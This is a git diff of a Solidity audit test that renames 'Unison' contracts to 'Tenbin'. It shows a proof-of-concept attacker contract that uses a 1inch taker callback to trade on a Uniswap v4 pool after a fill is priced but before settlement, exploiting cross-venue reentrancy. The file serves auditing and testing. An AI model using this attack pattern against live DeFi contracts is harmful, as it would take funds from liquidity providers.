@@ -10,22 +10,22 @@ import { ISwapVM } from "@1inch/swap-vm/contracts/interfaces/ISwapVM.sol";
 import { ITakerCallbacks } from "@1inch/swap-vm/contracts/interfaces/ITakerCallbacks.sol";
 import { TakerTraitsLib } from "@1inch/swap-vm/contracts/libs/TakerTraits.sol";
 
-import { UnisonHook } from "../../src/UnisonHook.sol";
-import { UnisonStrategy } from "../../src/aqua/UnisonStrategy.sol";
-import { UnisonPools } from "../../src/libraries/UnisonPools.sol";
-import { UnisonFixture, IPoolSwapTest } from "../utils/UnisonFixture.sol";
+import { TenbinHook } from "../../src/TenbinHook.sol";
+import { TenbinStrategy } from "../../src/aqua/TenbinStrategy.sol";
+import { TenbinPools } from "../../src/libraries/TenbinPools.sol";
+import { TenbinFixture, IPoolSwapTest } from "../utils/TenbinFixture.sol";
 
 /// @notice Audit PoC: a 1inch taker callback runs after SwapVM has priced the fill but before any coins move.
 ///         An attacker trades on the Uniswap venue inside that window, so both trades price off the same balances.
 contract CallbackAttacker is ITakerCallbacks {
     ISwapVM immutable svm;
     IPoolSwapTest immutable v4;
-    UnisonHook immutable hook;
+    TenbinHook immutable hook;
     address immutable usdc;
     address immutable weth;
     uint256 innerAmount;
 
-    constructor(ISwapVM _svm, IPoolSwapTest _v4, UnisonHook _hook, address _usdc, address _weth) {
+    constructor(ISwapVM _svm, IPoolSwapTest _v4, TenbinHook _hook, address _usdc, address _weth) {
         (svm, v4, hook, usdc, weth) = (_svm, _v4, _hook, _usdc, _weth);
         IERC20(_usdc).approve(address(_svm), type(uint256).max);
         IERC20(_usdc).approve(address(_v4), type(uint256).max);
@@ -35,7 +35,7 @@ contract CallbackAttacker is ITakerCallbacks {
     function _v4swap(address tin, address tout, uint256 amt) internal {
         bool z = tin < tout;
         v4.swap(
-            UnisonPools.key(address(hook), tin, tout),
+            TenbinPools.key(address(hook), tin, tout),
             SwapParams({ zeroForOne: z, amountSpecified: -int256(amt), sqrtPriceLimitX96: z ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1 }),
             IPoolSwapTest.TestSettings(false, false),
             ""
@@ -51,7 +51,7 @@ contract CallbackAttacker is ITakerCallbacks {
         t.useTransferFromAndAquaPush = true;
         t.isAToB = usdc < weth;
         t.hasPreTransferOutCallback = nested;
-        ISwapVM.Order memory o = UnisonStrategy.order(hook.maker(), address(hook), usdc, weth, uint64(hook.venueNonce()));
+        ISwapVM.Order memory o = TenbinStrategy.order(hook.maker(), address(hook), usdc, weth, uint64(hook.venueNonce()));
         svm.swap(o, amt, TakerTraitsLib.build(t));
         if (!nested) _v4swap(usdc, weth, amt); // honest: second buy after the first settled
         _v4swap(weth, usdc, IERC20(weth).balanceOf(address(this)));
@@ -65,9 +65,9 @@ contract CallbackAttacker is ITakerCallbacks {
     function preTransferInCallback(address, address, address, address, uint256, uint256, bytes32, bytes calldata) external { }
 }
 
-contract CrossVenueReentrancyTest is UnisonFixture {
+contract CrossVenueReentrancyTest is TenbinFixture {
     function setUp() public {
-        setUpUnison();
+        setUpTenbin();
     }
 
     function _run(bool nested) internal returns (int256 pnl) {
